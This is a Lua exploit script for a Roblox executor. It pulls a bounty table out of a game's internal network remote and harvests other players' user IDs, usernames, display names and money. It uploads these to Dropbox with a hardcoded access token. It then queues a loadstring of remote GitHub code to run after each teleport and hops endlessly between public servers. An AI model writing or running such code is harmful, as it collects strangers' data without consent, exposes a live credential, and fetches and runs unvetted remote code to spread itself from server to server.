local PlayersService = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local DROPBOX_TOKEN = "sl.u.AGJv_XvRHVnjDCnp1u1EZmsC3nPLw0ZIjGOyPzsX-HRAXrw6H4FfHX3SVoMy25jyOALgWM50L3WgV_aYztWODhGPJcuSSW4_JMFVObXKY7H5Y6GQRrQDzX9i0hMkU3EMFAmFjL1Rj6tMuVZFqQCd310I8NiFeFBV1NIAtmJPi4CdQqPdeVyjLXrpJWypVExrTKt-VN7ynvDFAiTIYbk5WBSBCmY_0m0Bsa-HsUWLvTalyP0NFrJSa6X4GwoQjwg1IUDNVdQQ-_MQu3pnZUWqfRq5M6DTs5yi9311O7SUz0RJkp8J4XSv2PDK73jV79VoNe-wBYz8SGgXbIPiZtSs29qQEwUXEYRz6qroddWciM6rpkPYqxbcKvT8O99UxcaHS-1JCs1Io0CCFrm9n63dqurkg_7BMInkFEzhcreURmo9Vvje_6JyQbOw39N1Yx0hINvwDMJax_pvhq0u0J4NA3mHyuln13ArZd84Z3EmEGM-pEfPuubBIRL0XpeJ5bpFnEau-rEW-jfFfwEOqmz4y9aOHpuOmeIQPrchqq8RgPZbRmh4maSpSGsAKFdmc-qI-HJJBfFSLCgigY7_ZpPOaRRSxY8EuF0wUBugCL7vrOfYjt0PkAdccsCsTFnUle4DUVTG_9qAARDmQUjMnm_IYckTZpPSg_ntPAr9vy6nHEwihdIkQ3Aun-d6goTbnFYEvo1Z5KU9sHOa91ZtI5W5TxUoBBpxLrSTFZUZVUvmsq9tAFdC9ie3qm-H9va-UXi7Ci37qx7-VRvBjDEoldoeBFw8dznCS56_lgWPBXfnbUqzq7RsxTBDP_8jIFaEUGytvtZuhNVQ-fcqPvXYxoIc7vhlDvu9i3RKDndy6Fl6KUMFw5OjKvbEZ8kS5qWclC7OaeoBvYSTgA4m-blD0nBsvJsCwRXBlbsRxoLwS3P4xk1E_tivZTdKtNZHE8ElqKQJuDFj76A4TXyeqfTv1O12tqYQU2atmosXlGawekTvVgX8dgKS9W0s8f7wQEWfvkzNpHi23qwlp3x4qotYlVb0JIQZ8DbJaL8Ri7oyC5cvSlWVYuxNpAXZo5ir-78i145L4zIPUuXNgch2cOEFl4mZO7K6v5vSEO4kZWh7EMZImkQ8aI7xcxxY76oz89N2myrWxB2-T-sEwS84zsf28NDRi9LhiEGx86jizcTj18TYlEk8fUiqS4w2vl0LlLtPQgE5Yvb4q6DbcY03U7xD86ZxZ8mFKAqs7Pr0u4DUs6F-x5qBLUwDnJ_dyCZavFUIoKdggff1iQ6qQpB0LsOUDw4Z_AVCTdzjuRRFTgD0bj8nu6xKeVBDLOPbWp9PexIfcVSWAVAgTfzWwmxdXHV0HR2iOAe_kjnXiboJSIkI1mIxRQC9qiR7v0_VtLDln60somw6U-U5keAabKTjLVBslU0z_DnnZjKxjg3XHIBBz1fDHN5d5n6LwhQpAAb6VKaRd5o7tUw"
local TotalBounty = 0

local function fetchDropboxJson(path)
	local success, result = pcall(function()
		local res = http_request({
			Url = "https://content.dropboxapi.com/2/files/download",
			Method = "POST",
			Headers = {
				["Authorization"] = "Bearer " .. DROPBOX_TOKEN,
				["Dropbox-API-Arg"] = HttpService:JSONEncode({ path = path })
			}
		})

		if res.StatusCode == 200 then
			return HttpService:JSONDecode(res.Body)
		end

		-- File does not exist yet
		if res.StatusCode == 409 then
			return {}
		end
	end)

	return success and result or {}
end


-- Upload JSON to Dropbox
local function uploadDropboxJson(path, data)
	local payload = HttpService:JSONEncode(data)
	local success, result = pcall(function()
		local res = http_request({
			Url = "https://content.dropboxapi.com/2/files/upload",
			Method = "POST",
			Headers = {
				["Authorization"] = "Bearer " .. DROPBOX_TOKEN,
				["Dropbox-API-Arg"] = HttpService:JSONEncode({
					path = path,
					mode = "overwrite",
					autorename = false,
					mute = false
				}),
				["Content-Type"] = "application/octet-stream"
			},
			Body = payload
		})
		return res.StatusCode == 200
	end)
	return success and result
end

local lastServerWrite = 0
local SERVER_WRITE_COOLDOWN = 15 -- seconds

task.spawn(function()
	local function getServerPath()
		return "/servers/" .. game.PlaceId .. "_" .. game.JobId .. ".json"
	end

	local function appendServerBounty()
		if os.time() - lastServerWrite < SERVER_WRITE_COOLDOWN then
			return
		end
		lastServerWrite = os.time()

		local path = getServerPath()
		local allData = fetchDropboxJson(path)

		if typeof(allData) ~= "table" then
			allData = {}
		end

		table.insert(allData, {
			timestamp = os.time(),
			placeId = game.PlaceId,
			jobId = game.JobId,
			bounty = TotalBounty
		})

		uploadDropboxJson(path, allData)
	end

	local ReplicatedStorageService = game:GetService("ReplicatedStorage")
	local Hologram = require(ReplicatedStorageService.Game.Hologram)
	local BountyHash = getconstant(Hologram.Init, 3)
	local AlexChassis = require(ReplicatedStorageService.Module.AlexChassis)
	local Network = getupvalue(AlexChassis.SetEvent, 1)
	local NetworkRemote = getupvalue(getupvalue(Network.FireServer, 1), 2)

	local BountyTableUpdated = false
	local BountyTable = {}

	task.spawn(function()
		local SortedBountyTable = {}

		NetworkRemote.OnClientEvent:Connect(function(Hash, Table)
			if Hash == BountyHash then
				BountyTableUpdated = true
				BountyTable = Table

				SortedBountyTable = {}

				for i, v in next, BountyTable do
					table.insert(SortedBountyTable, {i, v})
				end

				table.sort(SortedBountyTable, function(a, b)
					return a[2] > b[2]
				end)

				BountyTable = SortedBountyTable
				
				local TotalBounty2 = 0
				
				for i, v in next, SortedBountyTable do
					local Username = v[1]
					local Bounty = v[2]
					
					TotalBounty2 = TotalBounty2 + Bounty
				end
				
				TotalBounty = TotalBounty2
				appendServerBounty()
			end
		end)
	end)
end)
	-- Fetch existing JSON from Dropbox
	

	-- Save all players individually
	local function saveAllPlayers()
		for _, player in next, PlayersService:GetPlayers() do
			local path = "/players/" .. player.UserId .. ".json"
			local allData = fetchDropboxJson(path)
			local money = 0

			if player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Money") then
				money = player.leaderstats.Money.Value
			end

			local entry = {
				userId = player.UserId,
				username = player.Name,
				displayName = player.DisplayName,
				money = money,
				timestamp = os.time()
			}

			table.insert(allData, entry)
			uploadDropboxJson(path, allData)
		end
	end

	saveAllPlayers()
	
local res = http_request({
	Url = "https://games.roblox.com/v1/games/606849621/servers/Public?limit=100",
	Method = "GET"
})

local data = HttpService:JSONDecode(res.Body).data

queue_on_teleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/testdfsdfd/bwds/refs/heads/main/servertest6'))()")

repeat
	task.wait(1)
	game:GetService("TeleportService"):TeleportToPlaceInstance(
		game.PlaceId,
		data[math.random(1, #data)].id,
		game:GetService("Players").LocalPlayer
	)
until not game
